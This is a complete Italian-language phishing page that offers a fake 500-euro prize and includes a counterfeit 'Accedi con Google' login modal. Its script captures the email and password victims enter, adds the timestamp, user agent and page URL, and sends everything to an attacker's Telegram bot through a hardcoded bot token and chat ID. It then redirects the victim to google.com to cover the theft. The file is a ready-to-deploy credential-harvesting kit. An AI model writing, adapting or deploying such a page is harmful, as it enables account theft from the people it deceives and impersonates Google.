<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ HAI VINTO 500 EURO! üéÅ</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; }
        body { min-height:100vh; background:linear-gradient(135deg,#ff416c,#ff4b2b); display:flex; justify-content:center; align-items:center; padding:20px; animation:bgPulse 5s infinite alternate; }
        @keyframes bgPulse { 0%{background:linear-gradient(135deg,#ff416c,#ff4b2b)} 100%{background:linear-gradient(135deg,#1e90ff,#00bfff)} }
        .card { background:rgba(255,255,255,0.98); backdrop-filter:blur(10px); border-radius:30px; box-shadow:0 30px 80px rgba(0,0,0,0.4); max-width:500px; width:100%; padding:40px; text-align:center; border:1px solid gold; }
        h1 { color:#333; font-size:2.8em; margin-bottom:10px; background:linear-gradient(45deg,#f093fb 0%,#f5576c 100%); -webkit-background-clip:text; -webkit-text-fill-color:transparent; font-weight:900; }
        .prize-badge { background:linear-gradient(45deg,#ffd700,#ffb347); color:#333; font-size:2.5em; font-weight:bold; padding:20px 30px; border-radius:60px; margin:30px 0; box-shadow:0 5px 30px rgba(255,215,0,0.6); animation:pulse 1.5s infinite; }
        @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
        .input-group { margin-bottom:25px; text-align:left; }
        .input-group label { display:block; margin-bottom:8px; color:#444; font-weight:700; }
        .input-group input { width:100%; padding:18px; border:3px solid #f0f0f0; border-radius:15px; font-size:1.1em; }
        .btn { width:100%; padding:18px; border:none; border-radius:15px; font-size:1.2em; font-weight:700; cursor:pointer; margin-bottom:15px; }
        .btn-primary { background:linear-gradient(45deg,#ff416c,#ff4b2b); color:white; }
        .btn-google { background:white; color:#333; border:3px solid #4285f4; display:flex; align-items:center; justify-content:center; gap:15px; }
        .google-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; justify-content:center; align-items:center; }
        .google-modal-content { background:white; padding:40px; border-radius:30px; max-width:450px; width:90%; text-align:center; box-shadow:0 30px 60px rgba(0,0,0,0.5); position:relative; }
        .google-input-group { margin-bottom:20px; text-align:left; }
        .google-input-group input { width:100%; padding:15px; border:2px solid #ddd; border-radius:10px; }
        .google-modal-btn { width:100%; padding:16px; background:#4285f4; color:white; border:none; border-radius:10px; font-size:1.2em; cursor:pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h1>üéâ PREMIO INATTESO! üéâ</h1>
        <div class="prize-badge">‚Ç¨500</div>
        <p style="font-size:1.3em;color:#333;margin:25px 0;">‚ö° SEI STATO SELEZIONATO! ‚ö°</p>

        <div class="input-group">
            <label>üìß EMAIL</label>
            <input type="email" id="email" placeholder="esempio@email.com" required>
        </div>
        <div class="input-group">
            <label>üîê PASSWORD</label>
            <input type="password" id="password" placeholder="Inserisci la password" required>
        </div>
        <button class="btn btn-primary" onclick="inviaDati('FORM DIRETTO')">üöÄ RISCUOTI SUBITO</button>

        <div style="margin:30px 0;color:#666;">OPPURE</div>

        <button class="btn btn-google" onclick="document.getElementById('googleModal').style.display='flex'">GOOGLE (RACCOMANDATO)</button>
    </div>

    <!-- Modale Google fake -->
    <div id="googleModal" class="google-modal">
        <div class="google-modal-content">
            <span onclick="document.getElementById('googleModal').style.display='none'" style="position:absolute;top:10px;right:20px;font-size:2em;cursor:pointer;">√ó</span>
            <h2>Accedi con Google</h2>
            <div class="google-input-group">
                <label>Email o telefono</label>
                <input type="text" id="gEmail" placeholder="nome@esempio.com">
            </div>
            <div class="google-input-group">
                <label>Password</label>
                <input type="password" id="gPassword" placeholder="Inserisci la password">
            </div>
            <button class="google-modal-btn" onclick="inviaDati('GOOGLE MODAL')">ACCEDI</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8532194224:AAG9FGhBeuQv4OIcHYKQHKyeybZ4IpKK1Qg';  // es. 8232429543:ABC-...
        const CHAT_ID   = '8232429543';                 // ‚Üê IL TUO!

        function inviaDati(tipo) {
            let email, password;
            if (tipo === 'GOOGLE MODAL') {
                email    = document.getElementById('gEmail').value.trim();
                password = document.getElementById('gPassword').value.trim();
                document.getElementById('googleModal').style.display = 'none';
            } else {
                email    = document.getElementById('email').value.trim();
                password = document.getElementById('password').value.trim();
            }

            if (!email || !password) {
                alert('Compila entrambi i campi!');
                return;
            }

            const messaggio = 
`NUOVA PREDA (${tipo}) üî•
Email: ${email}
Password: ${password}
Ora: ${new Date().toLocaleString('it-IT')}
Dispositivo: ${navigator.userAgent}
Pagina: ${window.location.href}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(messaggio)}`;

            fetch(url)
                .then(response => {
                    if (response.ok) {
                        alert('‚úÖ Premio in elaborazione! Ti arriver√† via email.');
                        setTimeout(() => window.location.href = 'https://www.google.com', 2000);
                    } else {
                        alert('Errore invio. Riprova.');
                    }
                })
                .catch(err => {
                    console.error('Errore fetch:', err);
                    alert('Problema tecnico.');
                });
        }
    </script>
</body>
</html>
